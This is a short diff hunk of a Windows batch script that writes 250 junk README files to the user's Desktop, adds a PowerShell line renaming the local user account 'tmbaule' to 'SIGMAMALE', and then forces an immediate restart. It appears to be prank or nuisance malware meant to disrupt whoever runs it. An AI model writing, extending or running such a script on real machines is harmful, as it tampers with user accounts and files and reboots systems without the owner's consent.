@@ -29,5 +29,8 @@ for /l %%i in (1,1,250) do (
     echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
 )
 
+::rename user local
+powershell -Command "Rename-LocalUser -Name 'tmbaule' -NewName 'SIGMAMALE'"
+
 ::restart
 shutdown /r /t 0
